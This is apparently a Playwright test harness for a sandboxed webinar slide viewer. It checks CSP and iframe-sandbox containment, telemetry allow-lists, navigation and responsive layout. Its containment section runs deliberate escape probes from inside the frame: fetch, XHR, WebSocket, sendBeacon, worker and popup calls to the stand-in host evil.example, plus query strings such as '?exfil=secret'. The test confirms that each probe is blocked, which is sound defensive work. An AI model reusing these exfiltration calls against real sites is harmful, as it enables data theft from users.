async (page) => {
  page.setDefaultTimeout(7000);
  const origin = page.url().match(/^https?:\/\/[^/]+/)?.[0];
  const fixtureResponse = await page.request.get(`${origin}/tests/fixtures/studio-live-bundle.json`);
  const fixture = await fixtureResponse.json();
  const failures = [];
  const pageErrors = [];
  const expectedPolicyConsole = [];
  const observedPolicyCategories = new Set();
  const observedPolicyUrls = new Set();
  const unexpectedConsole = [];
  const unexpectedRequests = [];
  const localRequests = [];
  const deniedProbeRequests = [];
  const failedResources = [];
  const badResponses = [];
  const telemetry = [];
  const liveRequestHeaders = [];
  const screenshots = [];
  let servedVersion = 8;
  let bundleRequestCount = 0;

  const check = (condition, message) => {
    if (!condition) failures.push(message);
  };
  const EXPECTED_EXPOSED_DOWNLOAD_URL = 'https://evil.example/download';
  const EXPECTED_POLICY_FAILURES = new Set([
    'GET\nhttps://evil.example/fetch\n',
    'GET\nhttps://evil.example/fetch-audit\n',
    'GET\nhttps://evil.example/xhr\n',
    'GET\nhttps://evil.example/xhr-audit\n',
    'GET\nwss://evil.example/socket\n',
    'GET\nwss://evil.example/socket-audit\n',
    'GET\nhttps://evil.example/events\n',
    'GET\nhttps://evil.example/events-audit\n',
    'POST\nhttps://evil.example/beacon\nescape',
    'POST\nhttps://evil.example/beacon-audit\nescape',
    'GET\nhttps://evil.example/worker.js\n',
    'GET\nhttps://evil.example/worker-audit.js\n',
    'GET\nhttps://evil.example/sw.js\n',
    'GET\nhttps://evil.example/sw-audit.js\n',
    'GET\nhttps://evil.example/external.js\n',
    'GET\nhttps://evil.example/external.css\n',
    'GET\nhttps://evil.example/image.png\n',
    'GET\nhttps://evil.example/audio.mp3\n',
    'GET\nhttps://evil.example/video.mp4\n',
    'GET\nhttps://evil.example/frame\n',
    'GET\nhttps://evil.example/font.woff2\n',
  ]);
  const requestSignature = request => {
    try {
      return `${request.method()}\n${request.url()}\n${request.postData() ?? ''}`;
    } catch {
      return null;
    }
  };
  const isExpectedExposedDownloadRequest = request => {
    try {
      return request.method() === 'GET'
        && request.url() === EXPECTED_EXPOSED_DOWNLOAD_URL
        && request.postData() === null;
    } catch {
      return false;
    }
  };
  const isExpectedBrowserPolicyFailure = request => EXPECTED_POLICY_FAILURES.has(requestSignature(request));
  const requestProbe = (method, url, body = null) => ({
    method: () => method,
    url: () => url,
    postData: () => body,
  });
  check(isExpectedExposedDownloadRequest(requestProbe('GET', 'https://evil.example/download')),
    'harness self-test: exact exposed GET download must be recognized');
  check(!isExpectedExposedDownloadRequest(requestProbe('POST', 'https://evil.example/download-private', 'secret')),
    'harness self-test: POST /download-private must remain unexpected');
  check(!isExpectedExposedDownloadRequest(requestProbe('GET', 'https://evil.example/download?exfil=secret')),
    'harness self-test: query-bearing download must remain unexpected');
  check(!isExpectedExposedDownloadRequest(requestProbe('GET', 'https://evil.example/other')),
    'harness self-test: other same-domain routes must remain unexpected');
  check(!isExpectedExposedDownloadRequest(requestProbe('GET', 'https://evil.example/download', 'secret')),
    'harness self-test: a request body must prevent exposed-download recognition');
  check(!isExpectedBrowserPolicyFailure(requestProbe('POST', 'https://evil.example/download-private', 'secret')),
    'harness self-test: POST /download-private must not be an expected browser policy failure');
  check(!isExpectedBrowserPolicyFailure(requestProbe('GET', 'https://evil.example/download?exfil=secret')),
    'harness self-test: query-bearing download must not be an expected browser policy failure');
  check(!isExpectedBrowserPolicyFailure(requestProbe('GET', 'https://evil.example/other')),
    'harness self-test: other same-domain failures must remain unexpected');
  const CONNECT_POLICY_URLS = new Set([
    'https://evil.example/fetch',
    'https://evil.example/fetch-audit',
    'https://evil.example/xhr',
    'https://evil.example/xhr-audit',
    'wss://evil.example/socket',
    'wss://evil.example/socket-audit',
    'https://evil.example/events',
    'https://evil.example/events-audit',
    'https://evil.example/beacon',
    'https://evil.example/beacon-audit',
  ]);
  const POPUP_POLICY_URLS = new Set([
    'https://evil.example/popup',
    'https://evil.example/popup-audit',
  ]);
  const WORKER_POLICY_URLS = new Set([
    'https://evil.example/worker.js',
    'https://evil.example/worker-audit.js',
    'https://evil.example/sw.js',
    'https://evil.example/sw-audit.js',
  ]);
  const exactQuotedTarget = (text, prefix, urls, requiredFragments) => {
    if (!text.startsWith(prefix)) return null;
    const end = text.indexOf("'", prefix.length);
    if (end < 0) return null;
    const url = text.slice(prefix.length, end);
    return urls.has(url) && requiredFragments.every(fragment => text.includes(fragment)) ? url : null;
  };
  const policyConsoleSignatures = [
    {
      category: 'sandbox-top-navigation',
      match: text => text.startsWith('Unsafe attempt to initiate navigation for frame with origin ')
        && text.includes("from frame with URL 'about:srcdoc'.")
        && text.includes("flag of 'allow-top-navigation' or 'allow-top-navigation-by-user-activation' is not set."),
    },
    {
      category: 'sandbox-popup',
      match: text => exactQuotedTarget(text, "Blocked opening '", POPUP_POLICY_URLS,
        ["sandboxed frame whose 'allow-popups' permission is not set."]),
    },
    {
      category: 'sandbox-form',
      match: text => exactQuotedTarget(text, "Blocked form submission to '",
        new Set(['https://evil.example/form']), ["sandboxed and the 'allow-forms' permission is not set."]),
    },
    {
      category: 'csp-connect',
      match: text => exactQuotedTarget(text, "Connecting to '", CONNECT_POLICY_URLS,
        ["Content Security Policy directive: \"connect-src 'none'\"", 'The action has been blocked.']),
    },
    {
      category: 'csp-fetch-api',
      match: text => {
        const prefix = 'Fetch API cannot load ';
        const suffix = ". Refused to connect because it violates the document's Content Security Policy.";
        if (!text.startsWith(prefix) || !text.endsWith(suffix)) return null;
        const url = text.slice(prefix.length, -suffix.length);
        return new Set(['https://evil.example/fetch', 'https://evil.example/fetch-audit']).has(url) ? url : null;
      },
    },
    {
      category: 'csp-font',
      match: text => exactQuotedTarget(text, "Loading the font '",
        new Set(['https://evil.example/font.woff2']),
        ['Content Security Policy directive: "font-src https://assets.example"', 'The action has been blocked.']),
    },
    {
      category: 'csp-script',
      match: text => exactQuotedTarget(text, "Loading the script '",
        new Set(['https://evil.example/external.js']),
        ["Content Security Policy directive: \"script-src 'unsafe-inline'\"", 'The action has been blocked.']),
    },
    {
      category: 'csp-style',
      match: text => exactQuotedTarget(text, "Loading the stylesheet '",
        new Set(['https://evil.example/external.css']),
        ["Content Security Policy directive: \"style-src 'unsafe-inline'\"", 'The action has been blocked.']),
    },
    {
      category: 'csp-image',
      match: text => exactQuotedTarget(text, "Loading the image '",
        new Set(['https://evil.example/image.png']),
        ['Content Security Policy directive: "img-src https://assets.example data: blob:"', 'The action has been blocked.']),
    },
    {
      category: 'csp-media',
      match: text => exactQuotedTarget(text, "Loading media from  '",
        new Set(['https://evil.example/audio.mp3', 'https://evil.example/video.mp4']),
        ['Content Security Policy directive: "media-src https://assets.example blob:"', 'The action has been blocked.']),
    },
    {
      category: 'csp-frame',
      match: text => exactQuotedTarget(text, "Framing '", new Set(['https://evil.example/']),
        ["Content Security Policy directive: \"child-src 'none'\"", 'The request has been blocked.']),
    },
    {
      category: 'csp-worker',
      match: text => exactQuotedTarget(text, "Creating a worker from '", WORKER_POLICY_URLS,
        ["Content Security Policy directive: \"worker-src 'none'\"", 'blocked']),
    },
    {
      category: 'sandbox-download',
      match: text => text.startsWith('Download is disallowed.')
        && text.includes('frame initiating or instantiating the download is sandboxed')
        && text.includes("'allow-downloads'"),
    },
  ];
  const classifyExpectedPolicyConsole = text => {
    for (const signature of policyConsoleSignatures) {
      const match = signature.match(text);
      if (match) return { category: signature.category, url: typeof match === 'string' ? match : null };
    }
    return null;
  };
  check(classifyExpectedPolicyConsole(
    "Connecting to 'https://evil.example/fetch' violates the following Content Security Policy directive: \"connect-src 'none'\". The action has been blocked.",
  )?.category === 'csp-connect', 'harness self-test: exact CSP URL/category signature must be recognized');
  check(classifyExpectedPolicyConsole(
    "Connecting to 'https://evil.example/fetch?exfil=secret' violates the following Content Security Policy directive: \"connect-src 'none'\". The action has been blocked.",
  ) === null, 'harness self-test: query-bearing CSP console URL must remain unexpected');
  check(classifyExpectedPolicyConsole(
    "Loading the script 'https://evil.example/download-private' violates the following Content Security Policy directive: \"script-src 'unsafe-inline'\". The action has been blocked.",
  ) === null, 'harness self-test: other same-domain console URLs must remain unexpected');
  check(classifyExpectedPolicyConsole(
    "Connecting to 'https://evil.example/fetch' violates the following Content Security Policy directive: \"img-src 'none'\". The action has been blocked.",
  ) === null, 'harness self-test: allowed URL with the wrong policy category must remain unexpected');
  check(classifyExpectedPolicyConsole('A generic sandboxed warning') === null,
    'harness self-test: generic sandbox substrings must remain unexpected');
  const waitFrames = count => page.evaluate(frames => new Promise(resolve => {
    const step = () => frames-- > 0 ? requestAnimationFrame(step) : resolve();
    requestAnimationFrame(step);
  }), count);
  const bundleForVersion = version => ({
    ...fixture,
    webinar: { ...fixture.webinar, liveVersion: version },
  });
  const corsHeaders = {
    'access-control-allow-origin': origin,
    'access-control-allow-methods': 'GET, HEAD, POST, OPTIONS',
    'access-control-allow-headers': 'Content-Type, Accept',
    'access-control-max-age': '0',
    'cross-origin-resource-policy': 'cross-origin',
    vary: 'Origin',
  };

  page.on('pageerror', error => {
    const message = error?.message || String(error);
    if (message.includes('fixture-sync-private-source') || message.includes('fixture-async-private-source')) {
      pageErrors.push({ expectedRuntimeFixture: true, message });
    } else pageErrors.push({ expectedRuntimeFixture: false, message });
  });
  page.on('console', message => {
    if (!['warning', 'error'].includes(message.type())) return;
    const text = message.text();
    const classified = classifyExpectedPolicyConsole(text);
    if (!classified) {
      unexpectedConsole.push(`${message.type()}: ${text}`);
      return;
    }
    expectedPolicyConsole.push({ ...classified, text });
    observedPolicyCategories.add(classified.category);
    if (classified.url) observedPolicyUrls.add(classified.url);
  });
  page.on('requestfailed', request => {
    const url = request.url();
    if (!isExpectedExposedDownloadRequest(request) && !isExpectedBrowserPolicyFailure(request)) {
      failedResources.push(`${request.method()} ${url}: ${request.failure()?.errorText || 'failed'}`);
    }
  });
  page.on('response', response => {
    const status = response.status();
    if (status < 200 || status >= 400) badResponses.push(`${status} ${response.url()}`);
  });

  await page.context().route('**/*', async route => {
    const request = route.request();
    const url = request.url();
    const method = request.method();
    if (url.startsWith(`${origin}/`)) {
      localRequests.push(`${method} ${url.slice(origin.length)}`);
      await route.continue();
      return;
    }
    if (url === 'https://api.msfgco.com/api/public/webinars/first-home-without-mystery/live'
      && method === 'GET') {
      bundleRequestCount += 1;
      liveRequestHeaders.push(request.headers());
      const body = JSON.stringify(bundleForVersion(servedVersion));
      const digit = String(servedVersion % 10);
      await route.fulfill({
        status: 200,
        contentType: 'application/json; charset=utf-8',
        headers: {
          ...corsHeaders,
          'cache-control': 'public, max-age=0, must-revalidate, stale-if-error=300',
          etag: `\"${digit.repeat(64)}\"`,
        },
        body,
      });
      return;
    }
    if (url === 'https://api.msfgco.com/api/public/webinars/first-home-without-mystery/runtime-events') {
      if (method === 'OPTIONS') {
        await route.fulfill({ status: 204, headers: corsHeaders });
        return;
      }
      if (method === 'POST') {
        let parsed = null;
        try { parsed = request.postDataJSON(); } catch { /* asserted below */ }
        telemetry.push(parsed);
        await route.fulfill({ status: 200, headers: corsHeaders, contentType: 'application/json', body: '{}' });
        return;
      }
    }
    if (isExpectedExposedDownloadRequest(request)) {
      deniedProbeRequests.push(`${method} ${url}`);
      await route.fulfill({ status: 204, headers: { 'cache-control': 'no-store' } });
      return;
    }
    unexpectedRequests.push(`${method} ${url}`);
    await route.abort('blockedbyclient');
  });

  check(fixture.slides.length === 4,
    'fixture must include normal, containment, synchronous-error, and asynchronous-error slides');
  check(fixture.slides.some(slide => slide.anchor === 'async-error'),
    'fixture must include a named asynchronous runtime error slide');

  await page.goto(`${origin}/studio-viewer.html#normal`, { waitUntil: 'domcontentloaded' });
  await page.locator('[data-runtime-status]').filter({ hasText: 'Slide 1 of' }).waitFor();
  check(bundleRequestCount === 1, 'one public bundle request must serve the open audience session');
  check((await page.locator('[data-live-version]').textContent())?.trim() === 'Live version 8',
    'fresh session must display fixture live version 8');
  check(page.url().endsWith('#normal'), 'initial hash deep link must select the normal slide');

  const iframe = page.locator('[data-slide-frame] iframe');
  check(await iframe.getAttribute('sandbox') === 'allow-scripts',
    'slide iframe sandbox must be exactly allow-scripts');
  check(await iframe.getAttribute('allow') === null, 'slide iframe must not grant an allow capability policy');
  const normalFrame = page.frames().find(frame => frame.parentFrame() === page.mainFrame());
  const normalBoundary = await normalFrame.evaluate(() => ({
    origin: location.origin,
    csp: document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content || '',
    mountCount: document.querySelectorAll('[data-slide-mount]').length,
    bodyScroll: {
      width: document.documentElement.scrollWidth,
      clientWidth: document.documentElement.clientWidth,
      height: document.documentElement.scrollHeight,
      clientHeight: document.documentElement.clientHeight,
    },
  }));
  check(normalBoundary.origin === 'null', 'scripts-only sandbox must expose a unique opaque origin');
  check(normalBoundary.mountCount === 1, 'composed frame must contain exactly one trusted slide mount');
  for (const directive of [
    "default-src 'none'", "connect-src 'none'", "script-src 'unsafe-inline'",
    "form-action 'none'", "base-uri 'none'", "object-src 'none'",
    "worker-src 'none'", "child-src 'none'",
  ]) check(normalBoundary.csp.includes(directive), `frame CSP must include ${directive}`);
  check(normalBoundary.bodyScroll.width === normalBoundary.bodyScroll.clientWidth
      && normalBoundary.bodyScroll.height === normalBoundary.bodyScroll.clientHeight,
    'normal authored frame must have no internal document scrollbar');

  const nextButton = page.getByRole('button', { name: 'Next slide' });
  const previousButton = page.getByRole('button', { name: 'Previous slide' });
  const animationForward = page.getByRole('button', { name: 'Next animation' });
  const animationBack = page.getByRole('button', { name: 'Previous animation' });
  const animationPlay = page.getByRole('button', { name: 'Play animations' });
  const animationPause = page.getByRole('button', { name: 'Pause animations' });

  check(!(await animationForward.isDisabled()), 'recognized initial animation state must enable forward');
  await animationForward.click();
  check(!(await animationBack.isDisabled()), 'mouse animation-forward must enable animation-back');
  await animationPlay.click();
  check(!(await animationPause.isDisabled()), 'animation play must expose a usable pause control');
  await animationPause.click();
  await animationBack.click();

  const nonce = (await iframe.getAttribute('srcdoc'))?.match(/\"nonce\":\"([A-Za-z0-9_-]+)\"/)?.[1];
  check(Boolean(nonce), 'audit must recover the generated nonce only from the trusted frame element');
  const controlsBeforeHostileMessages = await page.evaluate(() => ({
    status: document.querySelector('[data-runtime-status]').textContent,
    forwardDisabled: document.querySelector('[data-animation="forward"]').disabled,
    count: document.querySelector('[data-slide-count]').textContent,
  }));
  await normalFrame.evaluate(validNonce => {
    parent.postMessage({ v: 1, nonce: 'wrong-nonce-value', type: 'animation-state', payload: { current: 3, total: 3, playing: true } }, '*');
    parent.postMessage({ v: 1, nonce: validNonce, type: 'not-allow-listed', payload: {} }, '*');
  }, nonce);
  await page.evaluate(validNonce => {
    window.postMessage({ v: 1, nonce: validNonce, type: 'animation-state', payload: { current: 3, total: 3, playing: true } }, '*');
  }, nonce);
  await page.waitForTimeout(100);
  const controlsAfterHostileMessages = await page.evaluate(() => ({
    status: document.querySelector('[data-runtime-status]').textContent,
    forwardDisabled: document.querySelector('[data-animation="forward"]').disabled,
    count: document.querySelector('[data-slide-count]').textContent,
  }));
  check(JSON.stringify(controlsAfterHostileMessages) === JSON.stringify(controlsBeforeHostileMessages),
    'wrong-nonce, unrecognized, and cross-window runtime messages must be ignored');

  await page.evaluate(() => { document.documentElement.dataset.trustedGuard = 'sealed'; });
  await nextButton.click();
  await page.locator('[data-runtime-status]').filter({ hasText: 'Slide 2 of' }).waitFor();
  const containmentFrame = page.frames().find(frame => frame.parentFrame() === page.mainFrame());
  const containment = await containmentFrame.evaluate(async () => {
    const probe = async fn => {
      try {
        const timeout = new Promise((_resolve, reject) => setTimeout(
          () => reject(new DOMException('Timed out', 'TimeoutError')), 500,
        ));
        await Promise.race([Promise.resolve().then(fn), timeout]);
        return { blocked: false };
      } catch (error) {
        return { blocked: true, error: String(error?.name || 'Error') };
      }
    };
    const definitions = {
      parentDocument: () => parent.document.title,
      topRead: () => top.location.href,
      topNavigate: () => { top.location.href = 'https://evil.example/top-audit'; },
      popup: () => {
        if (open('https://evil.example/popup-audit') === null) throw new DOMException('Blocked', 'SecurityError');
      },
      localStorage: () => localStorage.length,
      sessionStorage: () => sessionStorage.length,
      cookie: () => { document.cookie = 'fixture-audit=escape'; return document.cookie; },
      indexedDB: () => new Promise((resolve, reject) => {
        const request = indexedDB.open('escape-audit');
        request.onsuccess = () => resolve('opened');
        request.onerror = () => reject(request.error || new Error('blocked'));
      }),
      fetch: () => fetch('https://evil.example/fetch-audit'),
      xhr: () => new Promise((resolve, reject) => {
        const xhr = new XMLHttpRequest();
        xhr.onload = () => resolve(xhr.status);
        xhr.onerror = () => reject(new Error('blocked'));
        xhr.open('GET', 'https://evil.example/xhr-audit');
        xhr.send();
      }),
      websocket: () => new Promise((resolve, reject) => {
        const socket = new WebSocket('wss://evil.example/socket-audit');
        socket.onopen = () => resolve('opened');
        socket.onerror = () => reject(new Error('blocked'));
      }),
      eventSource: () => new Promise((resolve, reject) => {
        const stream = new EventSource('https://evil.example/events-audit');
        stream.onopen = () => resolve('opened');
        stream.onerror = () => { stream.close(); reject(new Error('blocked')); };
      }),
      beacon: () => {
        if (navigator.sendBeacon('https://evil.example/beacon-audit', 'escape')) return;
        throw new Error('blocked');
      },
      worker: () => {
        const worker = new Worker('https://evil.example/worker-audit.js');
        worker.terminate();
      },
      serviceWorker: () => navigator.serviceWorker
        ? navigator.serviceWorker.register('https://evil.example/sw-audit.js')
        : Promise.reject(new Error('unavailable')),
    };
    const results = Object.fromEntries(await Promise.all(
      Object.entries(definitions).map(async ([name, fn]) => [name, await probe(fn)]),
    ));
    return { results, origin: location.origin };
  });
  for (const probe of ['parentDocument', 'topRead', 'topNavigate', 'popup', 'localStorage', 'sessionStorage',
    'cookie', 'indexedDB', 'fetch', 'xhr', 'websocket', 'eventSource', 'worker', 'serviceWorker']) {
    check(containment.results[probe]?.blocked === true, `${probe} containment attempt must be blocked`);
  }
  check(observedPolicyUrls.has('https://evil.example/beacon-audit')
      && deniedProbeRequests.every(request => !request.includes('beacon-audit')),
    'sendBeacon may report queued but CSP must block it before a network request is dispatched');
  check(containment.origin === 'null', 'containment slide must retain an opaque origin');
  check(await page.evaluate(() => document.documentElement.dataset.trustedGuard) === 'sealed',
    'authored slide must not read or mutate trusted parent DOM');
  check(page.url().startsWith(origin), 'top navigation attempt must not leave the trusted local viewer');
  check(unexpectedRequests.length === 0,
    `CSP/sandbox must prevent outbound requests before dispatch: ${unexpectedRequests.join(' | ')}`);
  for (const [resource, url] of [
    ['external.js', 'https://evil.example/external.js'],
    ['external.css', 'https://evil.example/external.css'],
    ['image.png', 'https://evil.example/image.png'],
    ['audio.mp3', 'https://evil.example/audio.mp3'],
    ['video.mp4', 'https://evil.example/video.mp4'],
    ['frame', 'https://evil.example/'],
    ['font.woff2', 'https://evil.example/font.woff2'],
  ]) {
    check(observedPolicyUrls.has(url), `browser policy evidence must identify blocked ${resource}`);
  }
  for (const category of [
    'sandbox-top-navigation', 'sandbox-popup', 'sandbox-form', 'csp-connect',
    'csp-fetch-api', 'csp-font', 'csp-script', 'csp-style', 'csp-image',
    'csp-media', 'csp-frame',
  ]) check(observedPolicyCategories.has(category), `browser policy evidence must include ${category}`);
  check((await page.locator('[data-slide-count]').textContent())?.trim() === '2 / 4',
    'containment slide must preserve correct position output');

  await page.evaluate(() => history.back());
  await page.locator('[data-slide-count]').filter({ hasText: '1 / 4' }).waitFor();
  await page.evaluate(() => history.forward());
  await page.locator('[data-slide-count]').filter({ hasText: '2 / 4' }).waitFor();
  check(bundleRequestCount === 1, 'browser hash history must not trigger a hidden bundle refresh');

  await page.evaluate(() => document.activeElement?.blur());
  await page.keyboard.press('ArrowRight');
  await page.locator('[data-runtime-status]').filter({ hasText: 'unavailable' }).waitFor();
  check((await page.locator('[data-slide-unavailable]').textContent())?.trim() === 'Slide unavailable',
    'runtime failure must expose only the safe audience error state');
  check(!(await previousButton.isDisabled()), 'previous navigation must remain usable after runtime failure');
  check(telemetry.length === 1, 'synchronous runtime failure telemetry must post once');
  check(telemetry[0] && Object.keys(telemetry[0]).sort().join(',') === 'code,liveVersion,slideId',
    'runtime telemetry must contain exactly the three allow-listed fields');
  check(telemetry[0]?.liveVersion === 8
      && telemetry[0]?.slideId === '33333333-3333-4333-8333-333333333333'
      && telemetry[0]?.code === 'SLIDE_RUNTIME_ERROR',
    'synchronous runtime telemetry must preserve only its public version, slide ID, and safe code');
  check(JSON.stringify(telemetry).includes('fixture-sync-private-source') === false,
    'runtime telemetry must not contain private error source or stack data');
  await page.waitForTimeout(100);

  await page.evaluate(() => document.activeElement?.blur());
  await page.keyboard.press('Home');
  await page.locator('[data-slide-count]').filter({ hasText: '1 / 4' }).waitFor();
  await page.evaluate(() => { location.hash = '#sync-error'; });
  await page.locator('[data-runtime-status]').filter({ hasText: 'unavailable' }).waitFor();
  check(telemetry.length === 1, 'revisiting the same slide/code must deduplicate runtime telemetry');
  await page.evaluate(() => document.activeElement?.blur());
  await page.keyboard.press('Home');
  await page.locator('[data-slide-count]').filter({ hasText: '1 / 4' }).waitFor();
  await page.evaluate(() => document.activeElement?.blur());
  await page.keyboard.press('End');
  await page.locator('[data-runtime-status]').filter({ hasText: 'unavailable' }).waitFor();
  await page.waitForTimeout(100);
  check(telemetry.length === 2, 'asynchronous runtime failure telemetry must post once');
  check(telemetry.every(event => event && Object.keys(event).sort().join(',') === 'code,liveVersion,slideId'),
    'every runtime event must preserve the exact telemetry allow-list');
  check(telemetry[1]?.liveVersion === 8
      && telemetry[1]?.slideId === '44444444-4444-4444-8444-444444444444'
      && telemetry[1]?.code === 'SLIDE_RUNTIME_ERROR',
    'asynchronous runtime telemetry must preserve only its public version, slide ID, and safe code');
  check(JSON.stringify(telemetry).includes('fixture-async-private-source') === false,
    'asynchronous runtime telemetry must not contain private error source or stack data');
  await page.waitForTimeout(100);
  await page.evaluate(() => document.activeElement?.blur());
  await page.keyboard.press('Home');
  await page.locator('[data-slide-count]').filter({ hasText: '1 / 4' }).waitFor();

  await page.evaluate(() => {
    const shell = document.querySelector('[data-audience-shell]');
    Object.defineProperty(shell, 'requestFullscreen', {
      configurable: true,
      value: () => Promise.reject(new DOMException('fixture rejection', 'NotAllowedError')),
    });
  });
  await page.getByRole('button', { name: 'Enter fullscreen' }).click();
  await page.locator('[data-runtime-status]').filter({ hasText: 'Could not enter fullscreen' }).waitFor();
  check(await nextButton.isVisible(), 'navigation must remain visible after fullscreen rejection');

  servedVersion = 9;
  await nextButton.click();
  await page.waitForTimeout(150);
  check(bundleRequestCount === 1, 'server version change must not refresh an already-open session');
  check((await page.locator('[data-live-version]').textContent())?.trim() === 'Live version 8',
    'already-open session must remain pinned to version 8');
  await page.evaluate(() => document.activeElement?.blur());
  await page.keyboard.press('Home');
  await page.reload({ waitUntil: 'domcontentloaded' });
  await page.locator('[data-live-version]').filter({ hasText: 'Live version 9' }).waitFor();
  await page.locator('[data-runtime-status]').filter({ hasText: 'Slide 1 of' }).waitFor();
  check(bundleRequestCount === 2, 'full reload must make exactly one new bundle request');
  await page.waitForTimeout(250);
  check(bundleRequestCount === 2, 'ETag/revalidation behavior must not cause a hidden third request');

  await page.emulateMedia({ reducedMotion: 'reduce' });
  const reducedMotion = await page.evaluate(() => ({
    matches: matchMedia('(prefers-reduced-motion: reduce)').matches,
    transition: getComputedStyle(document.querySelector('[data-nav="next"]')).transitionDuration,
  }));
  check(reducedMotion.matches, 'reduced-motion emulation must reach the trusted shell');
  check(reducedMotion.transition.split(',').every(value => parseFloat(value) <= 0.001),
    'trusted-shell transitions must collapse under reduced motion');

  const viewports = [
    { width: 1920, height: 1080 },
    { width: 1366, height: 768 },
    { width: 1024, height: 768 },
    { width: 390, height: 844 },
    { width: 844, height: 390 },
  ];
  const matrix = [];
  for (const viewport of viewports) {
    const label = `${viewport.width}x${viewport.height}`;
    await page.setViewportSize(viewport);
    await waitFrames(3);
    await nextButton.focus();
    const metrics = await page.evaluate(() => {
      const doc = document.documentElement;
      const body = document.body;
      const shell = document.querySelector('[data-audience-shell]');
      const stage = document.querySelector('[data-stage]');
      const fitShell = document.querySelector('[data-fit-shell]');
      const frame = document.querySelector('[data-slide-frame] iframe');
      const nav = document.querySelector('.viewer-nav');
      const animation = document.querySelector('.viewer-animation');
      const focused = document.activeElement;
      const rect = element => {
        const value = element.getBoundingClientRect();
        return { left: value.left, top: value.top, right: value.right, bottom: value.bottom,
          width: value.width, height: value.height };
      };
      const focusStyle = getComputedStyle(focused);
      return {
        doc: { scrollWidth: doc.scrollWidth, clientWidth: doc.clientWidth,
          scrollHeight: doc.scrollHeight, clientHeight: doc.clientHeight },
        body: { scrollWidth: body.scrollWidth, clientWidth: body.clientWidth,
          scrollHeight: body.scrollHeight, clientHeight: body.clientHeight },
        overflow: {
          shell: getComputedStyle(shell).overflow,
          stage: getComputedStyle(stage).overflow,
          fitShell: getComputedStyle(fitShell).overflow,
        },
        stage: rect(stage), fitShell: rect(fitShell), frame: rect(frame), nav: rect(nav),
        animation: rect(animation),
        controls: [...document.querySelectorAll('.viewer-dock button')].map(button => ({
          name: button.getAttribute('aria-label'),
          ...rect(button),
        })),
        focus: { outlineStyle: focusStyle.outlineStyle, outlineWidth: focusStyle.outlineWidth },
        count: document.querySelector('[data-slide-count]').textContent.trim(),
        progress: {
          value: document.querySelector('[data-progress]').value,
          max: document.querySelector('[data-progress]').max,
        },
      };
    });
    check(metrics.doc.scrollWidth === metrics.doc.clientWidth,
      `${label}: outer document must not overflow horizontally`);
    check(metrics.doc.scrollHeight === metrics.doc.clientHeight
        && metrics.body.scrollHeight === metrics.body.clientHeight,
      `${label}: outer document must not expose a scrollbar`);
    check(metrics.overflow.shell === 'hidden' && metrics.overflow.stage === 'hidden'
        && metrics.overflow.fitShell === 'hidden', `${label}: fitted surfaces must suppress internal scrollbars`);
    check(metrics.fitShell.left >= metrics.stage.left - 1 && metrics.fitShell.top >= metrics.stage.top - 1
        && metrics.fitShell.right <= metrics.stage.right + 1 && metrics.fitShell.bottom <= metrics.stage.bottom + 1,
    `${label}: fitted 16:9 stage must stay inside its trusted viewport`);
    check(Math.abs(metrics.fitShell.width / metrics.fitShell.height - (16 / 9)) < 0.002,
      `${label}: fitted stage must preserve 16:9`);
    check(Math.abs(metrics.frame.width - metrics.fitShell.width) < 1.1
        && Math.abs(metrics.frame.height - metrics.fitShell.height) < 1.1,
    `${label}: iframe must fit without clipping`);
    check(metrics.nav.left >= 0 && metrics.nav.top >= 0
        && metrics.nav.right <= viewport.width + 1 && metrics.nav.bottom <= viewport.height + 1,
    `${label}: navigation must remain visible and reachable`);
    check(metrics.animation.left >= 0 && metrics.animation.top >= 0
        && metrics.animation.right <= viewport.width + 1 && metrics.animation.bottom <= viewport.height + 1,
    `${label}: animation controls must remain visible and reachable`);
    check(metrics.controls.every(control => control.width >= 38 && control.height >= 38
        && control.left >= 0 && control.top >= 0
        && control.right <= viewport.width + 1 && control.bottom <= viewport.height + 1),
    `${label}: every dock control must retain a reachable hit target`);
    check(metrics.focus.outlineStyle !== 'none' && parseFloat(metrics.focus.outlineWidth) >= 1,
      `${label}: keyboard focus must remain visibly indicated`);
    check(metrics.count === '1 / 4' && metrics.progress.value === 1 && metrics.progress.max === 4,
      `${label}: count and progress must remain correct`);
    const screenshot = `output/playwright/studio-renderer/${label}.png`;
    await page.screenshot({ path: screenshot, fullPage: true });
    screenshots.push(screenshot);
    matrix.push({ viewport: label, fit: `${metrics.fitShell.width.toFixed(2)}x${metrics.fitShell.height.toFixed(2)}` });
  }

  check(unexpectedConsole.length === 0,
    `unexpected console warnings/errors: ${unexpectedConsole.join(' | ')}`);
  check(pageErrors.every(item => item.expectedRuntimeFixture),
    `unexpected page errors: ${pageErrors.filter(item => !item.expectedRuntimeFixture).map(item => item.message).join(' | ')}`);
  check(failedResources.length === 0, `unexpected failed resources: ${failedResources.join(' | ')}`);
  check(badResponses.length === 0, `unexpected HTTP responses: ${badResponses.join(' | ')}`);
  check(liveRequestHeaders.length === 2, 'audit must capture exactly the initial and reload bundle requests');
  check(liveRequestHeaders.every(headers => headers.accept === 'application/json'
      && !Object.hasOwn(headers, 'authorization') && !Object.hasOwn(headers, 'cookie')),
    'public bundle requests must omit credentials and private authorization headers');
  check(deniedProbeRequests.length > 0
      && deniedProbeRequests.every(request => request === 'GET https://evil.example/download'),
    'only the planned sandboxed download probe may reach the local containment boundary');
  const allowedLocalRequests = new Set([
    'GET /studio-viewer.html',
    'GET /css/tokens.css',
    'GET /css/studio-viewer.css',
    'GET /js/annotate.js',
    'GET /js/surface-fit.js',
    'GET /js/overlay-geometry.js',
    'GET /js/studio/audience-controller.js',
    'GET /js/studio/bundle-loader.js',
    'GET /js/studio/slide-frame.js',
    'GET /js/studio/composition.js',
    'GET /js/studio/runtime-protocol.js',
  ]);
  check(localRequests.includes('GET /studio-viewer.html')
      && localRequests.every(request => allowedLocalRequests.has(request)),
    `local fixture server received an unexpected request: ${localRequests.filter(request => !allowedLocalRequests.has(request)).join(' | ')}`);

  const result = {
    status: failures.length ? 'fail' : 'pass',
    failures,
    counts: {
      fixtureSlides: fixture.slides.length,
      viewports: matrix.length,
      bundleRequests: bundleRequestCount,
      telemetryPosts: telemetry.length,
      unexpectedConsole: unexpectedConsole.length,
      unexpectedRequests: unexpectedRequests.length,
      localStaticRequests: localRequests.length,
      locallyContainedHostileUrls: new Set(deniedProbeRequests.map(request => request.split(' ').slice(1).join(' '))).size,
      failedResources: failedResources.length,
      unexpectedPageErrors: pageErrors.filter(item => !item.expectedRuntimeFixture).length,
    },
    matrix,
    screenshots,
  };
  if (failures.length) throw new Error(JSON.stringify(result));
  return result;
}
